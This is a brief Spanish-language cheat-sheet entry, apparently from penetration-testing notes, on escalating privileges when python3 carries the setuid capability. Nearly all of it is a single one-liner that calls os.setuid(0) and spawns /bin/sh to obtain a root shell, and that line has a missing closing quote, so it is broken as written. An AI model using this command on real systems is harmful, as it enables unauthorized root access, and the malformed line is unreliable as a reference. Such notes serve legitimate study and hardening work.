### Capabilities
#### Capability Setuid en python
si encontramos que python3 tiene la capability de setuid. con esta capability podemos ejecutar una shell cambiando la uid del usuario actual por "0" que es la de root.

```bash
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh)'
```
